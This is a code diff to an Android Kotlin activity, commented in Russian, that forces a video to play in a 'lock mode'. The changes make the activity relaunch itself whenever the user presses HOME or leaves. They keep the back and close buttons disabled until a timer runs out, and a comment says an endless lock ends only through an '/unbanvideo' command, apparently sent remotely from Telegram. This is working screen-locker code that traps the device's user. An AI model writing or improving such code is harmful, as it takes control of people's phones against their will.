@@ -34,15 +34,15 @@ class VideoActivity : AppCompatActivity() {
 
     private var videoResId: Int = 0
     private var videoUrl: String? = null
-    private var lockMode: Boolean = false    // блокировать кнопку HOME
-    private var duration: Int = 0            // обязательное время просмотра в сек (0 = без ограничения или до конца)
+    private var lockMode: Boolean = false
+    private var duration: Int = 0
 
     private var surfaceReady = false
     private var videoReady = false
     private var videoFile: File? = null
     private var secondsWatched = 0
     private var watchTimer: Job? = null
-    private var isVideoFinished = false
+    private var canClose = false  // true когда таймер вышел или duration==0
 
     companion object {
         private const val TAG = "VideoActivity"
@@ -50,25 +50,27 @@ class VideoActivity : AppCompatActivity() {
         const val EXTRA_VIDEO_URL = "video_url"
         const val EXTRA_LOCK = "lock"
         const val EXTRA_DURATION = "duration"
+        const val EXTRA_SECONDS_WATCHED = "seconds_watched"
 
-        // Глобальный флаг — ControlService смотрит на него для /unbanvideo
         var lockActive = false
 
-        fun startBuiltin(context: Context, videoNum: Int, lock: Boolean = false, duration: Int = 0) {
+        fun startBuiltin(context: Context, videoNum: Int, lock: Boolean = false, duration: Int = 0, secondsWatched: Int = 0) {
             context.startActivity(Intent(context, VideoActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                 putExtra(EXTRA_VIDEO_NUM, videoNum)
                 putExtra(EXTRA_LOCK, lock)
                 putExtra(EXTRA_DURATION, duration)
+                putExtra(EXTRA_SECONDS_WATCHED, secondsWatched)
             })
         }
 
-        fun startFromUrl(context: Context, url: String, lock: Boolean = false, duration: Int = 0) {
+        fun startFromUrl(context: Context, url: String, lock: Boolean = false, duration: Int = 0, secondsWatched: Int = 0) {
             context.startActivity(Intent(context, VideoActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                 putExtra(EXTRA_VIDEO_URL, url)
                 putExtra(EXTRA_LOCK, lock)
                 putExtra(EXTRA_DURATION, duration)
+                putExtra(EXTRA_SECONDS_WATCHED, secondsWatched)
             })
         }
 
@@ -94,6 +96,7 @@ class VideoActivity : AppCompatActivity() {
         videoUrl = intent.getStringExtra(EXTRA_VIDEO_URL)
         lockMode = intent.getBooleanExtra(EXTRA_LOCK, false)
         duration = intent.getIntExtra(EXTRA_DURATION, 0)
+        secondsWatched = intent.getIntExtra(EXTRA_SECONDS_WATCHED, 0)
 
         val videoNum = intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
         if (videoNum > 0) {
@@ -108,30 +111,32 @@ class VideoActivity : AppCompatActivity() {
 
         if (lockMode) lockActive = true
 
+        // Если таймер уже вышел (перезапуск после HOME) — сразу разрешаем закрыть
+        if (duration > 0 && secondsWatched >= duration) {
+            canClose = true
+            lockActive = false
+        }
+
         buildUI()
 
         if (videoUrl != null) downloadVideo(videoUrl!!)
     }
 
-    override fun onPause() {
-        super.onPause()
-        if (lockActive && !isVideoFinished) {
-            // Пользователь вышел пока видео ещё не кончилось
-            val videoNum = this.intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
-            val url = videoUrl
-            val dur = duration
+    override fun onStop() {
+        super.onStop()
+        // onStop вызывается когда activity уходит с экрана (HOME, другое приложение и т.д.)
+        // Если lock активен и таймер ещё не вышел — перезапускаем себя
+        if (lockActive && !canClose) {
             handler.postDelayed({
-                if (lockActive) {
-                    val serviceIntent = Intent(applicationContext, ControlService::class.java).apply {
-                        action = "RESTART_VIDEO"
-                        if (videoNum > 0) putExtra(EXTRA_VIDEO_NUM, videoNum)
-                        if (url != null) putExtra(EXTRA_VIDEO_URL, url)
-                        putExtra(EXTRA_LOCK, true)
-                        putExtra(EXTRA_DURATION, dur)
+                if (lockActive && !canClose) {
+                    val videoNum = intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
+                    if (videoNum > 0) {
+                        startBuiltin(applicationContext, videoNum, true, duration, secondsWatched)
+                    } else {
+                        videoUrl?.let { startFromUrl(applicationContext, it, true, duration, secondsWatched) }
                     }
-                    applicationContext.startService(serviceIntent)
                 }
-            }, 500L)
+            }, 400L)
         }
     }
 
@@ -168,15 +173,13 @@ class VideoActivity : AppCompatActivity() {
             Gravity.CENTER
         ))
 
-        // Крестик — скрыт пока не истечёт duration
         closeButton = ImageButton(this).apply {
             setImageResource(android.R.drawable.ic_menu_close_clear_cancel)
             setBackgroundColor(android.graphics.Color.parseColor("#CC000000"))
-            alpha = 0f
+            alpha = if (canClose) 1f else 0f
             setPadding(24, 24, 24, 24)
             setOnClickListener {
-                if (alpha >= 1f) {
-                    isVideoFinished = true
+                if (canClose) {
                     lockActive = false
                     finish()
                 }
@@ -216,11 +219,12 @@ class VideoActivity : AppCompatActivity() {
             mediaPlayer!!.setDisplay(surfaceView.holder)
             mediaPlayer!!.setOnVideoSizeChangedListener { _, w, h -> adjustSurfaceSize(w, h) }
             mediaPlayer!!.setOnCompletionListener {
-                if (lockMode) {
+                if (lockMode && !canClose) {
+                    // Зацикливаем пока таймер не вышел
                     mediaPlayer?.seekTo(0)
                     mediaPlayer?.start()
                 } else {
-                    isVideoFinished = true
+                    lockActive = false
                     finish()
                 }
             }
@@ -232,7 +236,7 @@ class VideoActivity : AppCompatActivity() {
             mediaPlayer!!.prepare()
             mediaPlayer!!.start()
 
-            startWatchTimer()
+            if (!canClose) startWatchTimer()
 
         } catch (e: Exception) {
             Log.e(TAG, "tryPlay failed: ${e.message}", e)
@@ -244,20 +248,20 @@ class VideoActivity : AppCompatActivity() {
         watchTimer?.cancel()
 
         if (duration == 0 && !lockMode) {
-            // Нет ограничений и не lock — крестик сразу через 3 сек
+            // Нет ограничений — крестик через 3 сек
             handler.postDelayed({
-                isVideoFinished = true  // не перезапускать при выходе
+                canClose = true
                 showCloseButton()
             }, 3000L)
             return
         }
 
         if (duration == 0 && lockMode) {
-            // Бесконечный lock — только /unbanvideo из тг может разблокировать
+            // Бесконечный lock — только /unbanvideo
             return
         }
 
-        // Считаем секунды просмотра
+        // Считаем секунды с учётом уже просмотренных (при перезапуске после HOME)
         watchTimer = scope.launch {
             while (secondsWatched < duration) {
                 delay(1000)
@@ -265,17 +269,16 @@ class VideoActivity : AppCompatActivity() {
                 val remaining = duration - secondsWatched
                 if (remaining <= 10 && remaining > 0) {
                     handler.post {
-                        statusText.text = "Закрытие через $remaining сек..."
+                        statusText.text = "Осталось: $remaining сек"
                         statusText.visibility = android.view.View.VISIBLE
                     }
                 }
             }
-            // Время вышло
             handler.post {
                 statusText.visibility = android.view.View.GONE
-                isVideoFinished = true   // разрешаем выход через onPause
-                lockActive = false       // сбрасываем глобальный lock — HOME больше не перезапускает
-                showCloseButton()        // показываем крестик в любом режиме
+                canClose = true
+                lockActive = false
+                showCloseButton()
             }
         }
     }
@@ -360,7 +363,10 @@ class VideoActivity : AppCompatActivity() {
     }
 
     override fun onBackPressed() {
-        if (!lockMode && closeButton.alpha >= 1f) super.onBackPressed()
+        if (canClose) {
+            lockActive = false
+            super.onBackPressed()
+        }
     }
 
     override fun onDestroy() {
@@ -369,7 +375,6 @@ class VideoActivity : AppCompatActivity() {
         scope.cancel()
         try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (e: Exception) { }
         mediaPlayer = null
-        if (!lockActive) lockActive = false
         super.onDestroy()
     }
 }
